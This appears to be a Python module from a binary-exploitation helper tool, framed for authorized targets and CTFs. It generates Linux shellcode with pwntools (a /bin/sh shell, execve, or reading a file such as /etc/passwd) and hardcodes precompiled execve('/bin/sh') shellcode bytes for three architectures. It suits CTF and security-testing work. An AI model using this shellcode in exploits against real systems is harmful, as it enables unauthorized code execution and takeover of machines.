"""Shellcode generator (pwntools shellcraft).

Emits standard exploitation-primitive shellcode (execve /bin/sh, cat a file) for an
AUTHORIZED target / CTF, for the requested architecture. Reminds you that stack shellcode
needs NX disabled."""
from __future__ import annotations

from typing import Optional

try:
    import os as _os
    _os.environ.setdefault('PWNLIB_NOTERM','1')
    from pwn import context, asm, shellcraft  # type: ignore
    from binoracle import _quiet_pwn as _qp; _qp()
    _HAVE_PWN = True
except Exception:
    _HAVE_PWN = False



# Well-known public execve("/bin/sh") shellcodes, used as a fallback when a cross-arch
# assembler is not available (e.g. pwntools 'as' missing on macOS).
_PRECOMPILED_SH = {
    "amd64": bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05"),
    "i386":  bytes.fromhex("31c050682f2f7368682f62696e89e3505389e131d2b00bcd80"),
    "aarch64": bytes.fromhex("420002ca6f0e8ed2ae0dadd270ee8ef2ee0e9df2010000ca01008fd2210c9fd2e103bfa9e0230091e803002be40300911f2003d5010000d4"),
}


def gen_shellcode(arch: str = "amd64", kind: str = "sh", arg: Optional[str] = None,
                  nx: Optional[bool] = None) -> str:
    if not _HAVE_PWN:
        return "pwntools not installed: pip install pwntools to enable shellcode generation."
    try:
        context.clear()
        context.arch = arch
        context.os = "linux"
    except Exception as e:
        return f"bad arch '{arch}': {e}"

    src = None
    blob = None
    try:
        if kind == "sh":
            src = shellcraft.sh()
        elif kind == "cat":
            src = shellcraft.cat(arg or "/etc/passwd")
        elif kind == "execve":
            src = shellcraft.execve(arg or "/bin/sh", 0, 0)
        else:
            return f"unknown kind '{kind}' (use sh|cat|execve)"
        blob = asm(src)
    except Exception as e:
        # fall back to a known-good precompiled execve('/bin/sh') if possible
        if kind in ("sh", "execve") and (arg in (None, "/bin/sh")) and arch in _PRECOMPILED_SH:
            blob = _PRECOMPILED_SH[arch]
            src = f"// precompiled execve('/bin/sh') for {arch} (no local assembler available)"
        else:
            return (f"shellcraft needs a cross-assembler not installed for arch={arch}. "
                    f"Install binutils for {arch}, or use kind=sh on amd64/i386/aarch64 "
                    f"(precompiled). Original error: {e}")

    hexs = blob.hex()
    out = [
        f"# shellcode: {kind}  arch={arch}  length={len(blob)} bytes",
        "# For an AUTHORIZED target / CTF. Stack execution requires NX disabled.",
    ]
    if nx:
        out.append("# NOTE: NX is ON on your target -> you cannot run this on the stack; "
                   "use ROP (ret2libc/ret2syscall) or an mprotect chain instead.")
    out.append("## bytes")
    out.append("```")
    out.append("shellcode = bytes.fromhex('" + hexs + "')")
    out.append("```")
    out.append("## pwntools")
    out.append("```python")
    out.append("from pwn import *")
    out.append(f"context.arch = {arch!r}")
    out.append(f"shellcode = asm(shellcraft.{kind}({repr(arg) if arg else ''}))")
    out.append("```")
    out.append("## disassembly source")
    out.append("```asm")
    out.append(src.strip())
    out.append("```")
    return "\n".join(out)
